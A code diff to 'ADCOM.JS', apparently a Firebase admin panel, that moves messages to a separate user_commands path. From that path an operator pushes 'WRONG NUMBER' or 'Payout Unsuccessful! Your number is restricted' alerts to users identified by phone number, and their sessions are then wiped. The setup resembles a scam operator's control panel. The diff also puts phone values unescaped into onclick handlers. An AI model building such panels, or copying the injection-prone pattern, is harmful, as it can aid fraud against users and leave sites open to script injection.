@@ -1,5 +1,5 @@
 /**
- * ADCOM.JS - Admin to User Chat
+ * ADCOM.JS - Admin to User Chat (with separate command path)
  */
 
 // ========== DETECT CURRENT PAGE ==========
@@ -83,8 +83,8 @@ async function showUserDetailsPopup(phone) {
                 </div>
                 <div class="command-buttons-section">
                     <div class="command-buttons-grid">
-                        <button class="command-btn command-1" onclick="sendMessageToUser('${phone}', '1')">📧 WRONG NUMBER</button>
-                        <button class="command-btn command-2" onclick="sendMessageToUser('${phone}', '2')">📞 RESTRICTED</button>
+                        <button class="command-btn command-1" onclick="sendCommand('${phone}', '1')">📧 WRONG NUMBER</button>
+                        <button class="command-btn command-2" onclick="sendCommand('${phone}', '2')">📞 RESTRICTED</button>
                     </div>
                 </div>
             </div>
@@ -101,8 +101,8 @@ function closeUserCommandPopup() {
     if (popup) popup.remove();
 }
 
-// ========== ADMIN: SEND MESSAGE ==========
-async function sendMessageToUser(phone, type) {
+// ========== ADMIN: SEND COMMAND SA SEPARATE PATH ==========
+async function sendCommand(phone, type) {
     if (!isAdminPage) return;
     
     closeUserCommandPopup();
@@ -114,11 +114,11 @@ async function sendMessageToUser(phone, type) {
         message = '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.';
     }
     
-    await db.ref('user_sessions/' + phone).update({
-        adminMessage: {
-            text: message,
-            type: type
-        }
+    // Gumamit ng SEPARATE PATH: user_commands/{phone}
+    await db.ref('user_commands/' + phone).set({
+        message: message,
+        type: type,
+        timestamp: Date.now()
     });
 }
 
@@ -150,30 +150,34 @@ function observeTableChanges() {
     makePhonesClickable();
 }
 
-// ========== USER: SIMPLE LISTENER - ALERT LANG ==========
-function listenForMessages() {
+// ========== USER: LISTEN SA SEPARATE PATH ==========
+function listenForCommands() {
     const userPhone = localStorage.getItem('userPhone');
     if (!userPhone) return;
     
-    const userRef = db.ref('user_sessions/' + userPhone);
+    // Nakikinig LANG sa user_commands/{phone} - HINDI sa user_sessions
+    const commandRef = db.ref('user_commands/' + userPhone);
     
-    userRef.on('value', (snapshot) => {
-        const data = snapshot.val();
+    commandRef.on('value', (snapshot) => {
+        const command = snapshot.val();
         
-        if (data && data.adminMessage) {
-            const msg = data.adminMessage;
+        // KUNG MAY COMMAND
+        if (command) {
+            // MAG-ALERT KAY USER
+            alert(command.message);
             
-            // ALERT LANG - ITO LANG LALABAS KAY USER
-            alert(msg.text);
+            // DELETE COMMAND PARA HINDI MAULIT
+            db.ref('user_commands/' + userPhone).remove();
             
-            // Remove message
-            db.ref('user_sessions/' + userPhone + '/adminMessage').remove();
-            
-            // Clear data and redirect
+            // CLEAR DATA AT REDIRECT
             localStorage.removeItem('userPhone');
             localStorage.removeItem('userDeviceId');
             localStorage.removeItem('userSession');
+            
+            // I-DELETE ANG USER SESSION
             db.ref('user_sessions/' + userPhone).remove();
+            
+            // REDIRECT
             window.location.href = 'index.html';
         }
     });
@@ -189,9 +193,9 @@ function init() {
         }
     } else {
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => setTimeout(listenForMessages, 1000));
+            document.addEventListener('DOMContentLoaded', () => setTimeout(listenForCommands, 1000));
         } else {
-            setTimeout(listenForMessages, 1000);
+            setTimeout(listenForCommands, 1000);
         }
     }
 }
